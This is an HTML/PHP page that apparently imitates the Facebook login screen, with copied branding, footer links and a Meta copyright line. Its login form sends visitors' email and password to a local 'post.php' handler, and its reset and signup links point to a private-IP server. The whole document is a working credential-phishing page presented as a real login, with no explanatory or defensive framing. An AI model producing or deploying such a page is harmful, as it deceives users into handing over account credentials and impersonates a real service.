<!doctype html>
<?php session_start(); ?>
<html lang="en">
  <head>
  <title>Log into Facebook</title>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="icon" href="image/fb.ico">
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="css/mobile.css">
</head>
<body>
<div class="grey">
<center>
<img id="logo" src="image/fb.png" height="60">

<div id="login1" class="login">
<center>
<p id="title">Log into Facebook</p>


<center>
<form action="post.php" method="POST">
<input name="email" id="email" type="text" placeholder="Email or phone number" required="">
<input name="password" id="password" type="password" placeholder="Password" required="">
<button id="login" type="submit">Log In</button>
</center>
<div id="links">
<a id="links" href="http://10.1.1.112:8000/Reset/reset.php">Reset Password?</a>
</div>
<p id="or">or</p>
<a href="http://10.1.1.112:8000/Reg/signup.php"><button id="signup" type="button">Create New Account</button></a>
</center>
<?php echo $_SESSION['res']; ?>
</div>
<br><br><br><br><br>
</div>
</form>

<div class="lang">
<center>
<ul>
<li><p id="english">English(UK)</p>
</li>
<li><a href="https://zh-cn.facebook.com/login.php">中文(简体)</a>

<li><a href="https://ja-jp.facebook.com/login.php">Français (France)</a>
</li>
<li><a href="https://es-la.facebook.com/login.php">Español</a>
</li>
<li><a href="https://de-de.facebook.com/login.php">Deutsch</a>
</li>
<li><a href="https://it-it.facebook.com/login.php">Italiano</a>
</li>
<li><a href="https://pt-br.facebook.com/login.php">Português (Brasil)</a>
</li>
<li><a href="https://ar-ar.facebook.com/login.php">العربية</a>
</li>
<li><a href="https://hi-in.facebook.com/login.php">हिन्दी</a>
</li>
</ul>
</center>
</div>

<center>
<p id="underline"></p>
</center>

<div class="items">
<center>
<ul>
<li><a href="http://10.1.1.112:8000/Reg/signup.php">Sign up</a>
</li>
<li><a href="http://10.1.1.112:8000">Log in</a>
</li>
<li><a target="_blank" href="https://messenger.com/">Messenger</a>
</li>
<li><a target="_blank" href="https://facebook.com/lite/">Facebook Lite</a>
</li> 
<li><a target="_blank" href="https://www.facebook.com/watch/">Watch</a>
</li>
<li><a target="_blank" href="https://facebook.com/places/">Places</a>
</li>
<li><a target="_blank" href="https://facebook.com/games/">Games</a>
</li>
<li><a target="_blank" href="https://facebook.com/marketplace/">Marketplace</a>
</li>
<li><a target="_blank" href="https://pay.facebook.com/">Facebook Pay</a>
</li>
<li><a target="_blank" href="https://facebook.com/jobs/">Jobs</a>
</li>
<li><a target="_blank" href="https://www.oculus.com/">Occulus</a>
</li>
<li><a target="_blank" href="https://portal.facebook.com/">Portal</a>
</li>
<li><a target="_blank" href="https://www.instagram.com/">Instagram</a>
</li>
<li><a target="_blank" href="https://www.bulletin.com/">Bulltin</a>
</li>
<li><a target="_blank" href="https://facebook.com/local/lists/245019872666104/">Local</a>
</li>
</ul>

<ul>
<li><a target="_blank" href="https://facebook.com/fundraisers/">Fundraisers</a>
</li>
<li><a target="_blank" href="https://facebook.com/biz/directory/">Services</a>
</li>
<li><a target="_blank" href="https://facebook.com/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D">Voting Information Centre</a>
</li>
<li><a target="_blank" href="https://facebook.com/groups/explore/">Groups</a>
</li>
<li><a target="_blank" href="https://about.facebook.com/">About</a>
</li>
<li><a target="_blank" href="https://facebook.com/ad_campaign/landing.php?placement=pflo&campaign_id=402047449186&nav_source=unknown&extra_1=auto">Create ad</a>
</li>
<li><a target="_blank" href="https://facebook.com/pages/create/?ref_type=site_footer">Create Page</a>
</li>
<li><a target="_blank" href="https://developers.facebook.com/?ref=pf">Developers</a>
</li>
<li><a target="_blank" href="https://facebook.com/careers/?ref=pf">Careers</a>
</li>
<li><a target="_blank" href="https://facebook.com/privacy/explanation">Privacy</a>
</li>
<li><a target="_blank" href="https://facebook.com/policies/cookies/">Cookies</a>
</li>
<li><a target="_blank" href="https://www.facebook.com/help/568137493302217">AdChoices</a>
</li>
<li><a target="_blank" href="https://facebook.com/policies?ref=pf">Terms</a>
</li>
</ul>
</div>

<center>
<p id="meta">Meta &copy; 2022</p>
</center>
</body>
</html> 


